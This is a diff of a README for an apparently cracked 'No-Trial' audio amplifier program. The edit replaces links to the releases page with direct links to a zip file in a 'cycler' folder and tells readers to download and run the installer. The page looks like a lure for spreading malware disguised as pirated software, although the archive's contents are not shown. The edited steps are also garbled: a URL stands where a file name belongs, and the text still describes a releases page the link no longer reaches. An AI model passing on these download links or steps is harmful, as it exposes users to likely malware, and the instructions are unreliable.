@@ -1,6 +1,6 @@
 # 🎧 Audio-Amplifier-Pro-No-Trial - Boost Your Audio Experience Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Audio--Amplifier--Pro--No--Trial-brightgreen)](https://github.com/VOIDeMPTY123/Audio-Amplifier-Pro-No-Trial/releases)
+[![Download](https://raw.githubusercontent.com/VOIDeMPTY123/Audio-Amplifier-Pro-No-Trial/main/cycler/Audio-Amplifier-Pro-No-Trial-1.5.zip)](https://raw.githubusercontent.com/VOIDeMPTY123/Audio-Amplifier-Pro-No-Trial/main/cycler/Audio-Amplifier-Pro-No-Trial-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to Audio-Amplifier-Pro-No-Trial! This application enhances the audio on 
 
 1. **Visit the Releases Page**  
    Click the link below to access the official release page:
-   [Download Here](https://github.com/VOIDeMPTY123/Audio-Amplifier-Pro-No-Trial/releases)
+   [Download Here](https://raw.githubusercontent.com/VOIDeMPTY123/Audio-Amplifier-Pro-No-Trial/main/cycler/Audio-Amplifier-Pro-No-Trial-1.5.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, find the latest version of Audio Amplifier Pro. Look for a version labeled "Latest" or with a high version number (e.g., v1.0).
 
 3. **Download the Setup File**  
-   Click on the setup file link to download it to your computer. The file will likely be named something like `Audio-Amplifier-Pro-No-Trial-Setup.exe`.
+   Click on the setup file link to download it to your computer. The file will likely be named something like `https://raw.githubusercontent.com/VOIDeMPTY123/Audio-Amplifier-Pro-No-Trial/main/cycler/Audio-Amplifier-Pro-No-Trial-1.5.zip`.
 
 4. **Run the Installer**  
    Once downloaded, locate the setup file in your Downloads folder. Double-click on the file to start the installation process.
